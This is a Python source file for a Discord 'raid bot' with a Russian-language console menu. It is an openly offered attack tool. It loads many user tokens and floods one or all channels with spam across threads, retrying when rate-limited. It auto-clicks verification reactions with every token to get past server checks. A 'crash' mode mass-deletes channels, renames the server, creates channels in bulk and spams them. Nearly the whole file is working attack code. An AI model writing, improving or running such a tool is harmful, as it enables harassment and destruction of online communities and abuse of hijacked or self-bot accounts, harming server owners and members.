import requests
import os
import sys
import time
import random
import json
import threading
from urllib.parse import quote as url_quote
from concurrent.futures import ThreadPoolExecutor

class DiscordRaidBot:
    def __init__(self):
        self.tokens = []
        self.session = requests.Session()
        self.server_id = None
        self.channel_id = None
        self.raid_all_channels = False
        self.messages = []
        self.is_raiding = False
        self.channels = []
        self.sent_messages = 0
        self.banned_tokens = 0
        self.server_name = ""
        self.delay = 1
        self.total_messages_to_send = 0
        self.lock = threading.Lock()
        self.config_dir = "config"
        self.verification_method = "reaction"
        self.dragon_logo = '''                                         _.oo.
                 _.u[[/;:,.         .odMMMMMM\'
              .o888UU[[[/;:-.  .o@P^    MMM^
             oN88888UU[[[/;::-.        dP^
            dNMMNN888UU[[[/;:--.   .o@P^
           ,MMMMMMN888UU[[/;::-. o@^
           NNMMMNN888UU[[[/~.o@P^
           888888888UU[[[/o@^-..
          oI8888UU[[[/o@P^:--..
       .@^  YUU[[[/o@^;::---..
     oMP     ^/o@P^;:::---..
  .dMMM    .o@^ ^;::---...
 dMMMMMMM@^`       `^^^^
YMMMUP^
 ^^'''

    def get_color_code(self, color):
        colors = {
            'red': '\033[91m', 'white': '\033[97m', 'bright_red': '\033[1;91m',
            'bright_white': '\033[1;97m', 'reset': '\033[0m', 'bold': '\033[1m'
        }
        return colors.get(color, '')

    def clear_console(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def show_loading(self, text="Loading", duration=1):
        self.clear_console()
        print(f"{self.get_color_code('red')}{self.dragon_logo}{self.get_color_code('reset')}")
        loading_bar_height = 6
        bar_length = 40
        for _ in range(loading_bar_height):
            print()

        for i in range(101):
            percent = i
            filled_length = int(bar_length * percent // 100)
            bar = '▌' * filled_length + '-' * (bar_length - filled_length)
            
            frame_lines = [
                f"╔{'=' * (bar_length + 12)}╗",
                f"║{' ' * (bar_length + 12)}║",
                f"║ {percent:3d}% - {text:<{bar_length + 6}} ║",
                f"║ {bar} ║",
                f"║{' ' * (bar_length + 12)}║",
                f"╚{'=' * (bar_length + 12)}╝"
            ]

            sys.stdout.write(f"\033[{loading_bar_height}A")
            for line in frame_lines:
                sys.stdout.write(f"\r{self.get_color_code('red')}{line}{self.get_color_code('reset')}\n")
            sys.stdout.flush()
            time.sleep(duration / 100)

        sys.stdout.write(f"\033[{loading_bar_height}A")
        for _ in range(loading_bar_height):
            sys.stdout.write(f"\r{' ' * (bar_length + 14)}\n")
        sys.stdout.write(f"\033[{loading_bar_height}A")
        sys.stdout.flush()
        print()

    def print_header(self):
        header = '''

██████╗░░█████╗░██╗██████╗░  ██████╗░██╗░░░██╗  ░█████╗░███╗░░██╗░██████╗░███████╗██╗░░░░░░█████╗░
██╔══██╗██╔══██╗██║██╔══██╗  ██╔══██╗╚██╗░██╔╝  ██╔══██╗████╗░██║██╔════╝░██╔════╝██║░░░░░██╔══██╗
██████╔╝███████║██║██║░░██║  ██████╦╝░╚████╔╝░  ███████║██╔██╗██║██║░░██╗░█████╗░░██║░░░░░╚═╝███╔╝
██╔══██╗██╔══██║██║██║░░██║  ██╔══██╗░░╚██╔╝░░  ██╔══██║██║╚████║██║░░╚██╗██╔══╝░░██║░░░░░░░░╚══╝░
██║░░██║██║░░██║██║██████╔╝  ██████╦╝░░░██║░░░  ██║░░██║██║░╚███║╚██████╔╝███████╗███████╗░░░██╗░░
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░  ╚═════╝░░░░╚═╝░░░  ╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░╚══════╝╚══════╝░░░╚═╝░░
'''
        print(f"{self.get_color_code('red')}{header}{self.get_color_code('reset')}")

    def print_dynamic_menu(self, config_files):
        self.clear_console()
        self.print_header()
        menu_offset = 0

        if config_files:
            print(f"{self.get_color_code('red')}+==============================================================+{self.get_color_code('reset')}")
            print(f"{self.get_color_code('red')}|                   ДОСТУПНЫЕ КОНФИГИ                        |{self.get_color_code('reset')}")
            print(f"{self.get_color_code('red')}+==============================================================+{self.get_color_code('reset')}")
            for i, filename in enumerate(config_files):
                print(f"{self.get_color_code('red')}|  {i + 1}. Загрузить '{filename}'{' ' * (51 - len(filename))}|{self.get_color_code('reset')}")
            menu_offset = len(config_files)

        menu_items = [
            "Добавить токены",
            "Сохранить текущий конфиг",
            "Настроить сервер и каналы (для рейда)",
            "Добавить сообщения для рейда",
            "Настроить задержку рейда",
            "Настроить верификацию",
            "Начать рейд",
            "Краш сервера (требуются права админа)",
            "Попытаться пройти верификацию на сервере",
            "Остановить рейд",
            "Показать статистику",
            "Выход"
        ]

        print(f"{self.get_color_code('red')}+==============================================================+{self.get_color_code('reset')}")
        print(f"{self.get_color_code('red')}|                        ГЛАВНОЕ МЕНЮ                          |{self.get_color_code('reset')}")
        print(f"{self.get_color_code('red')}+==============================================================+{self.get_color_code('reset')}")
        for i, item in enumerate(menu_items):
            print(f"{self.get_color_code('red')}|  {i + 1 + menu_offset}. {item:<56}|{self.get_color_code('reset')}")
        print(f"{self.get_color_code('red')}+==============================================================+{self.get_color_code('reset')}")
        
        return menu_offset, menu_items

    def show_raid_stats(self):
        bar_length = 40
        while self.is_raiding:
            self.clear_console()
            print(f"{self.get_color_code('red')}{self.dragon_logo}{self.get_color_code('reset')}")
            print()

            stats = f'''Количество ботов: {len(self.tokens)}
Отправленных сообщенний: {self.sent_messages}
Замученных/забанненых ботов: {self.banned_tokens}
Вариантов сообщений: {len(self.messages)}
Отправить сообщений: {self.total_messages_to_send if self.total_messages_to_send > 0 else 'Бесконечно'}
Задержка отправки сообщений: {self.delay} сек'''
            print(f"{self.get_color_code('red')}{stats}{self.get_color_code('reset')}")
            print()

            if self.total_messages_to_send > 0:
                percent = int((self.sent_messages / self.total_messages_to_send) * 100) if self.total_messages_to_send > 0 else 0
                percent = min(100, percent)
                filled_length = int(bar_length * percent // 100)
                bar = '▌' * filled_length + '-' * (bar_length - filled_length)
                
                padding = bar_length + 4 - len('Рейда')
                raid_text = f"Рейда{' ' * padding}"
                
                frame_lines = [
                    f"╔{'=' * (bar_length + 12)}╗",
                    f"║{' ' * (bar_length + 12)}║",
                    f"║ {percent:3d}% - {raid_text}║",
                    f"║ {bar} ║",
                    f"║{' ' * (bar_length + 12)}║",
                    f"╚{'=' * (bar_length + 12)}╝"
                ]
                for line in frame_lines:
                    print(f"{self.get_color_code('red')}{line}{self.get_color_code('reset')}")
            else:
                print(f"{self.get_color_code('red')}Рейд в процессе...{self.get_color_code('reset')}")

            print(f"\n{self.get_color_code('red')}Нажмите Enter для возврата в главное меню...{self.get_color_code('reset')}")
            time.sleep(1)

    def send_message(self, token, channel_id, message):
        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        data = {'content': message}
        url = f'https://discord.com/api/v9/channels/{channel_id}/messages'

        if not self.is_raiding: 
            return False

        try:
            response = self.session.post(url, headers=headers, json=data, timeout=10)
            if response.status_code == 200:
                with self.lock:
                    self.sent_messages += 1
                return True
            elif response.status_code == 429:
                retry_after = response.json().get('retry_after', 1)
                time.sleep(retry_after)
                return self.send_message(token, channel_id, message)
            elif response.status_code in [401, 403]:
                with self.lock:
                    self.banned_tokens += 1
                return False
            else:
                return False
        except requests.exceptions.RequestException:
            return False

    def get_guild_channels(self, token, guild_id):
        headers = {'Authorization': token}
        url = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
        try:
            response = self.session.get(url, headers=headers)
            if response.status_code == 200:
                return response.json()
            return []
        except Exception:
            return []

    def get_guild_name(self, token, guild_id):
        headers = {'Authorization': token}
        url = f'https://discord.com/api/v9/guilds/{guild_id}'
        try:
            response = self.session.get(url, headers=headers)
            if response.status_code == 200:
                return response.json().get('name', 'Unknown Server')
            return 'Unknown Server'
        except Exception:
            return 'Unknown Server'

    def add_tokens(self):
        self.show_loading("Добавление токенов", 0.5)
        self.tokens = []
        print(f"{self.get_color_code('red')}Введите токены (для завершения введите 'готово'):{self.get_color_code('reset')}")
        while True:
            token = input(f"{self.get_color_code('red')}Токен: {self.get_color_code('reset')}")
            if token.lower() == 'готово':
                break
            if token:
                self.tokens.append(token)
                print(f"{self.get_color_code('bright_white')}✓ Токен добавлен (всего: {len(self.tokens)}){self.get_color_code('reset')}")
        input(f"\n{self.get_color_code('red')}Нажмите Enter для продолжения...{self.get_color_code('reset')}")

    def save_config(self):
        self.show_loading("Сохранение конфига", 0.5)
        if not os.path.exists(self.config_dir):
            os.makedirs(self.config_dir)
        
        filename = input(f"{self.get_color_code('red')}Введите имя файла для сохранения (без .json): {self.get_color_code('reset')}")
        if not filename:
            print(f"{self.get_color_code('red')}❌ Имя файла не может быть пустым!{self.get_color_code('reset')}")
            input(f"\n{self.get_color_code('red')}Нажмите Enter...{self.get_color_code('reset')}")
            return

        filepath = os.path.join(self.config_dir, f"{filename}.json")
        
        config_data = {
            "tokens": self.tokens,
            "server_id": self.server_id,
            "channel_id": self.channel_id,
            "raid_all_channels": self.raid_all_channels,
            "messages": self.messages,
            "delay": self.delay
        }
        
        try:
            with open(filepath, 'w') as f:
                json.dump(config_data, f, indent=4)
            print(f"{self.get_color_code('bright_white')}✓ Конфиг сохранен в {filepath}{self.get_color_code('reset')}")
        except Exception as e:
            print(f"{self.get_color_code('red')}❌ Ошибка сохранения конфига: {e}{self.get_color_code('reset')}")
        input(f"\n{self.get_color_code('red')}Нажмите Enter...{self.get_color_code('reset')}")

    def load_config(self, filename):
        self.show_loading(f"Загрузка {filename}", 0.5)
        filepath = os.path.join(self.config_dir, filename)
        try:
            with open(filepath, 'r') as f:
                config_data = json.load(f)
            
            self.tokens = config_data.get("tokens", [])
            self.server_id = config_data.get("server_id")
            self.channel_id = config_data.get("channel_id")
            self.raid_all_channels = config_data.get("raid_all_channels", False)
            self.messages = config_data.get("messages", [])
            self.delay = config_data.get("delay", 1)
            
            print(f"{self.get_color_code('bright_white')}✓ Конфиг '{filename}' успешно загружен.{self.get_color_code('reset')}")
        except Exception as e:
            print(f"{self.get_color_code('red')}❌ Ошибка загрузки конфига: {e}{self.get_color_code('reset')}")
        input(f"\n{self.get_color_code('red')}Нажмите Enter...{self.get_color_code('reset')}")

    def setup_server_channels(self):
        self.show_loading("Настройка сервера для рейда", 0.5)
        while True:
            server_input = input(f"\n{self.get_color_code('red')}Введите ID Discord сервера: {self.get_color_code('reset')}")
            if server_input.isdigit():
                self.server_id = int(server_input)
                self.server_name = self.get_guild_name(self.tokens[0] if self.tokens else "", self.server_id)
                break
            else:
                print(f"{self.get_color_code('red')}❌ Неверный формат ID!{self.get_color_code('reset')}")
        
        print(f"\n{self.get_color_code('red')}1. Рейдить в конкретном канале\n2. Рейдить во всех каналах{self.get_color_code('reset')}")
        while True:
            choice = input(f"{self.get_color_code('red')}Ваш выбор (1-2): {self.get_color_code('reset')}")
            if choice == "1":
                self.raid_all_channels = False
                while True:
                    channel_input = input(f"\n{self.get_color_code('red')}Введите ID канала: {self.get_color_code('reset')}")
                    if channel_input.isdigit():
                        self.channel_id = int(channel_input)
                        break
                    else:
                        print(f"{self.get_color_code('red')}❌ Неверный формат ID!{self.get_color_code('reset')}")
                break
            elif choice == "2":
                self.raid_all_channels = True
                break
            else:
                print(f"{self.get_color_code('red')}❌ Неверный выбор!{self.get_color_code('reset')}")
        input(f"\n{self.get_color_code('red')}Нажмите Enter...{self.get_color_code('reset')}")

    def add_messages(self):
        self.show_loading("Добавление сообщений", 0.5)
        print(f"\n{self.get_color_code('red')}Введите сообщения (для завершения введите 'готово'):{self.get_color_code('reset')}")
        self.messages = []
        while True:
            message = input(f"{self.get_color_code('red')}Сообщение: {self.get_color_code('reset')}")
            if message.lower() == 'готово':
                break
            if message:
                self.messages.append(message)
        input(f"\n{self.get_color_code('red')}Нажмите Enter...{self.get_color_code('reset')}")

    def setup_delay(self):
        self.show_loading("Настройка задержки", 0.5)
        while True:
            delay_input = input(f"\n{self.get_color_code('red')}Введите задержку в секундах (например, 0.5): {self.get_color_code('reset')}")
            try:
                self.delay = float(delay_input)
                break
            except ValueError:
                print(f"{self.get_color_code('red')}❌ Неверный формат!{self.get_color_code('reset')}")
        input(f"\n{self.get_color_code('red')}Нажмите Enter...{self.get_color_code('reset')}")

    def setup_verification(self):
        self.show_loading("Настройка верификации", 0.5)
        print(f"{self.get_color_code('red')}Выберите метод верификации:{self.get_color_code('reset')}")
        print(f"1. Нажатие на реакцию (по умолчанию)")
        choice = input(f"{self.get_color_code('red')}Ваш выбор: {self.get_color_code('reset')}")
        if choice == '1':
            self.verification_method = "reaction"
            print(f"{self.get_color_code('bright_white')}✓ Метод верификации 'Нажатие на реакцию' выбран.{self.get_color_code('reset')}")
        else:
            print(f"{self.get_color_code('red')}❌ Неверный выбор. Используется метод по умолчанию.{self.get_color_code('reset')}")
        input(f"\n{self.get_color_code('red')}Нажмите Enter...{self.get_color_code('reset')}")

    def start_raid(self):
        if not all([self.tokens, self.server_id, self.messages]):
            print(f"{self.get_color_code('red')}❌ Не все параметры настроены! Загрузите конфиг или настройте вручную.{self.get_color_code('reset')}")
            input(f"\n{self.get_color_code('red')}Нажмите Enter...{self.get_color_code('reset')}")
            return

        while True:
            total_messages_input = input(f"\n{self.get_color_code('red')}Сколько сообщений отправить (0 для бесконечного рейда): {self.get_color_code('reset')}")
            if total_messages_input.isdigit():
                self.total_messages_to_send = int(total_messages_input)
                break
            else:
                print(f"{self.get_color_code('red')}❌ Неверный формат!{self.get_color_code('reset')}")

        self.is_raiding = True
        self.sent_messages = 0
        self.banned_tokens = 0
        self.show_loading("Начало рейда", 1)

        if self.raid_all_channels:
            all_guild_channels = self.get_guild_channels(self.tokens[0], self.server_id)
            if not all_guild_channels:
                print(f"{self.get_color_code('red')}❌ Не удалось получить каналы!{self.get_color_code('reset')}")
                self.is_raiding = False
                return
            self.channels = [ch for ch in all_guild_channels if ch.get('type') == 0]
        else:
            self.channels = [{'id': self.channel_id}]

        if not self.channels:
            print(f"{self.get_color_code('red')}❌ Не найдены подходящие текстовые каналы для рейда!{self.get_color_code('reset')}")
            self.is_raiding = False
            return

        for token in self.tokens:
            thread = threading.Thread(target=self.raid_worker, args=(token,))
            thread.daemon = True
            thread.start()
        
        self.show_raid_stats()

    def raid_worker(self, token):
        local_message_index = 0
        while self.is_raiding:
            if self.total_messages_to_send > 0 and self.sent_messages >= self.total_messages_to_send:
                self.is_raiding = False
                break
            
            if not self.messages:
                self.is_raiding = False
                break
                
            message = self.messages[local_message_index % len(self.messages)]
            
            for channel in self.channels:
                if not self.is_raiding: break
                self.send_message(token, channel['id'], message)
                if self.delay > 0:
                    time.sleep(self.delay)
            
            local_message_index += 1

    def attempt_verification(self):
        if self.verification_method == "reaction":
            self.verify_by_reaction()
        else:
            print(f"{self.get_color_code('red')}❌ Неизвестный метод верификации: {self.verification_method}{self.get_color_code('reset')}")
            input(f"\n{self.get_color_code('red')}Нажмите Enter...{self.get_color_code('reset')}")

    def verify_by_reaction(self):
        self.show_loading("Попытка верификации", 1)
        if not self.tokens or not self.server_id:
            print(f"{self.get_color_code('red')}❌ Сначала добавьте токены и укажите ID сервера!{self.get_color_code('reset')}")
            input(f"\n{self.get_color_code('red')}Нажмите Enter...{self.get_color_code('reset')}")
            return

        verification_channel_names = ["verify", "verification", "rules", "правила", "верификация", "react"]
        channels = self.get_guild_channels(self.tokens[0], self.server_id)
        target_channel = next((ch for ch in channels if ch.get('type') == 0 and any(name in ch.get('name', '').lower() for name in verification_channel_names)), None)
        
        if not target_channel:
            print(f"{self.get_color_code('red')}❌ Не найден канал для верификации.{self.get_color_code('reset')}")
            input(f"\n{self.get_color_code('red')}Нажмите Enter...{self.get_color_code('reset')}")
            return

        print(f"Найден канал: {target_channel['name']} ({target_channel['id']})")
        headers = {'Authorization': self.tokens[0]}
        url = f"https://discord.com/api/v9/channels/{target_channel['id']}/messages?limit=10"
        try:
            response = self.session.get(url, headers=headers)
            messages = response.json()
            for msg in messages:
                if 'reactions' in msg and msg['reactions']:
                    reaction = msg['reactions'][0]
                    emoji = reaction['emoji']
                    emoji_identifier = f"{emoji['name']}:{emoji['id']}" if emoji['id'] else url_quote(emoji['name'])
                    react_url = f"https://discord.com/api/v9/channels/{target_channel['id']}/messages/{msg['id']}/reactions/{emoji_identifier}/@me"
                    
                    print(f"Найдена реакция! Попытка нажать на {emoji['name']}...")
                    with ThreadPoolExecutor(max_workers=20) as executor:
                        results = list(executor.map(lambda token: self.session.put(react_url, headers={'Authorization': token}).status_code, self.tokens))
                    success_count = results.count(204)
                    print(f"{self.get_color_code('bright_white')}✓ Попытка верификации завершена. Успешно: {success_count}/{len(self.tokens)}.{self.get_color_code('reset')}")
                    input(f"\n{self.get_color_code('red')}Нажмите Enter...{self.get_color_code('reset')}")
                    return
        except Exception as e:
            print(f"{self.get_color_code('red')}❌ Ошибка при поиске сообщения для верификации: {e}{self.get_color_code('reset')}")
        
        print(f"{self.get_color_code('red')}❌ Не найдено сообщений с реакциями.{self.get_color_code('reset')}")
        input(f"\n{self.get_color_code('red')}Нажмите Enter...{self.get_color_code('reset')}")

    def crash_server(self):
        self.clear_console()
        self.print_header()
        
        target_server_id = input(f"{self.get_color_code('red')}Введите ID сервера для краша: {self.get_color_code('reset')}")
        if not target_server_id.isdigit():
            print(f"{self.get_color_code('red')}❌ Неверный ID сервера.{self.get_color_code('reset')}")
            input(f"\n{self.get_color_code('red')}Нажмите Enter...{self.get_color_code('reset')}")
            return

        print(f"\n{self.get_color_code('red')}Выберите, что использовать для краша:\n1. Токен бота\n2. Токены пользователей (из загруженного конфига/списка){self.get_color_code('reset')}")
        auth_choice = input(f"{self.get_color_code('red')}Ваш выбор: {self.get_color_code('reset')}")

        auth_headers = []

        if auth_choice == '1':
            bot_token = input(f"{self.get_color_code('red')}Введите токен вашего бота: {self.get_color_code('reset')}")
            if not bot_token:
                print(f"{self.get_color_code('red')}❌ Токен не может быть пустым.{self.get_color_code('reset')}")
                return
            auth_headers.append({'Authorization': f'Bot {bot_token}', 'Content-Type': 'application/json'})
        elif auth_choice == '2':
            if not self.tokens:
                print(f"{self.get_color_code('red')}❌ Токены пользователей не загружены. Добавьте их через меню.{self.get_color_code('reset')}")
                input(f"\n{self.get_color_code('red')}Нажмите Enter...{self.get_color_code('reset')}")
                return
            print(f"{self.get_color_code('bright_white')}ВНИМАНИЕ: Убедитесь, что загруженные токены имеют права администратора на сервере!{self.get_color_code('reset')}")
            for token in self.tokens:
                auth_headers.append({'Authorization': token, 'Content-Type': 'application/json'})
        else:
            print(f"{self.get_color_code('red')}❌ Неверный выбор.{self.get_color_code('reset')}")
            return

        crash_options = {
            'del_channels': False, 'add_channels': False,
            'spam_channels': False, 'rename_server': False
        }
        crash_config = {}

        while True:
            self.clear_console()
            self.print_header()
            print(f"Меню краша для сервера: {target_server_id}\n")

            op1_status = '√' if crash_options['del_channels'] else '✘'
            op2_status = '√' if crash_options['add_channels'] else '✘'
            op3_status = '√' if crash_options['spam_channels'] else '✘'
            op4_status = '√' if crash_options['rename_server'] else '✘'

            print(f"1. [{op1_status}] Удалить все каналы и категории")
            print(f"2. [{op2_status}] Создать N каналов")
            print(f"3. [{op3_status}] Отправить сообщение во все каналы")
            print(f"4. [{op4_status}] Изменить название сервера")
            print(f"\n5. {self.get_color_code('bright_red')}Начать краш{self.get_color_code('reset')}")
            print(f"6. Отмена")

            choice = input(f"\n{self.get_color_code('red')}Выберите пункт для переключения или запуска: {self.get_color_code('reset')}")

            if choice == '1':
                crash_options['del_channels'] = not crash_options['del_channels']
            elif choice == '2':
                crash_options['add_channels'] = not crash_options['add_channels']
                if crash_options['add_channels']:
                    crash_config['add_channels_name'] = input("Название для новых каналов: ")
                    crash_config['add_channels_count'] = int(input("Количество каналов: "))
            elif choice == '3':
                crash_options['spam_channels'] = not crash_options['spam_channels']
                if crash_options['spam_channels']:
                    print("Введите сообщение. Используйте \\n для переноса строки.")
                    crash_config['spam_message'] = input("Сообщение: ").replace('\\n', '\n')
            elif choice == '4':
                crash_options['rename_server'] = not crash_options['rename_server']
                if crash_options['rename_server']:
                    crash_config['rename_name'] = input("Новое название сервера: ")
            elif choice == '5':
                confirm = input(f"{self.get_color_code('bright_red')}ВЫ УВЕРЕНЫ? (yes/no): {self.get_color_code('reset')}").lower()
                if confirm == 'yes':
                    self._execute_crash(target_server_id, auth_headers, crash_options, crash_config)
                break
            elif choice == '6':
                break
            else:
                print("Неверный выбор.")
                time.sleep(1)

    def _execute_crash(self, server_id, auth_headers, options, config):
        self.show_loading("ЗАПУСК КРАША...", 2)
        main_header = auth_headers[0]

        with ThreadPoolExecutor(max_workers=50) as executor:
            if options['del_channels']:
                print("Удаление каналов...")
                channels = self.get_guild_channels(main_header['Authorization'], server_id)
                list(executor.map(self._delete_channel, [ch['id'] for ch in channels], [main_header] * len(channels)))

            if options['rename_server']:
                print("Изменение названия сервера...")
                executor.submit(self._rename_server, server_id, config['rename_name'], main_header)

            if options['add_channels']:
                print("Создание каналов...")
                list(executor.map(self._create_channel, [server_id] * config['add_channels_count'], [config['add_channels_name']] * config['add_channels_count'], [main_header] * config['add_channels_count']))
            
            time.sleep(2)

            if options['spam_channels']:
                print("Спам в каналы...")
                all_channels = self.get_guild_channels(main_header['Authorization'], server_id)
                text_channels = [ch for ch in all_channels if ch.get('type') == 0]
                
                spam_tasks = []
                for header in auth_headers:
                    for channel in text_channels:
                        for _ in range(5):
                            spam_tasks.append(executor.submit(self._spam_message, channel['id'], config['spam_message'], header))
                for task in spam_tasks:
                    task.result()

        print(f"\n{self.get_color_code('bright_white')}✓ Краш-операции завершены.{self.get_color_code('reset')}")
        input(f"\n{self.get_color_code('red')}Нажмите Enter...{self.get_color_code('reset')}")

    def _delete_channel(self, channel_id, header):
        requests.delete(f'https://discord.com/api/v9/channels/{channel_id}', headers=header)

    def _rename_server(self, server_id, new_name, header):
        requests.patch(f'https://discord.com/api/v9/guilds/{server_id}', headers=header, json={'name': new_name})

    def _create_channel(self, server_id, name, header):
        requests.post(f'https://discord.com/api/v9/guilds/{server_id}/channels', headers=header, json={'name': name, 'type': 0})

    def _spam_message(self, channel_id, message, header):
        requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=header, json={'content': message}, timeout=5)

    def stop_raid(self):
        self.is_raiding = False
        print(f"\n{self.get_color_code('bright_white')}✓ Рейд остановлен.{self.get_color_code('reset')}")

    def show_stats(self):
        self.show_loading("Загрузка статистики", 0.5)
        print(f"\n{self.get_color_code('red')}Аккаунты: {len(self.tokens)}{self.get_color_code('reset')}")
        server_id_text = self.server_id if self.server_id else 'Не настроен'
        print(f"{self.get_color_code('red')}Сервер ID: {server_id_text}{self.get_color_code('reset')}")
        
        mode_text = "Все каналы" if self.raid_all_channels else f"Канал ID: {self.channel_id if self.channel_id else 'Не настроен'}"
        print(f"{self.get_color_code('red')}Режим: {mode_text}{self.get_color_code('reset')}")

        print(f"{self.get_color_code('red')}Сообщений: {len(self.messages)}{self.get_color_code('reset')}")
        print(f"{self.get_color_code('red')}Задержка: {self.delay} сек{self.get_color_code('reset')}")
        status_text = 'Активен' if self.is_raiding else 'Остановлен'
        print(f"{self.get_color_code('red')}Статус рейда: {status_text}{self.get_color_code('reset')}")
        input(f"\n{self.get_color_code('red')}Нажмите Enter...{self.get_color_code('reset')}")

    def run(self):
        if not os.path.exists(self.config_dir):
            os.makedirs(self.config_dir)
            
        while True:
            config_files = [f for f in os.listdir(self.config_dir) if f.endswith('.json')]
            menu_offset, menu_items = self.print_dynamic_menu(config_files)
            
            try:
                choice_input = input(f"\n{self.get_color_code('red')}Выберите пункт меню: {self.get_color_code('reset')}")
                if not choice_input: continue
                choice = int(choice_input)
                
                if 1 <= choice <= menu_offset:
                    self.load_config(config_files[choice - 1])
                    continue

                action_choice = choice - menu_offset
                if 1 <= action_choice <= len(menu_items):
                    action_name = menu_items[action_choice - 1]
                    
                    if action_name == "Выход":
                        print(f"{self.get_color_code('red')}До свидания!{self.get_color_code('reset')}")
                        break
                    
                    action_map = {
                        "Добавить токены": self.add_tokens,
                        "Сохранить текущий конфиг": self.save_config,
                        "Настроить сервер и каналы (для рейда)": self.setup_server_channels,
                        "Добавить сообщения для рейда": self.add_messages,
                        "Настроить задержку рейда": self.setup_delay,
                        "Настроить верификацию": self.setup_verification,
                        "Начать рейд": self.start_raid,
                        "Краш сервера (требуются права админа)": self.crash_server,
                        "Попытаться пройти верификацию на сервере": self.attempt_verification,
                        "Остановить рейд": self.stop_raid,
                        "Показать статистику": self.show_stats
                    }

                    action_to_run = action_map.get(action_name)
                    if action_to_run:
                        action_to_run()
                        if action_name == "Остановить рейд":
                            input(f"\n{self.get_color_code('red')}Нажмите Enter для продолжения...{self.get_color_code('reset')}")
                    else:
                        print(f"{self.get_color_code('red')}❌ Ошибка: Действие не найдено.{self.get_color_code('reset')}")
                        time.sleep(1)
                else:
                    raise ValueError

            except (ValueError, IndexError):
                print(f"{self.get_color_code('red')}❌ Неверный выбор!{self.get_color_code('reset')}")
                input(f"\n{self.get_color_code('red')}Нажмите Enter...{self.get_color_code('reset')}")

if __name__ == "__main__":
    bot = DiscordRaidBot()
    bot.run()
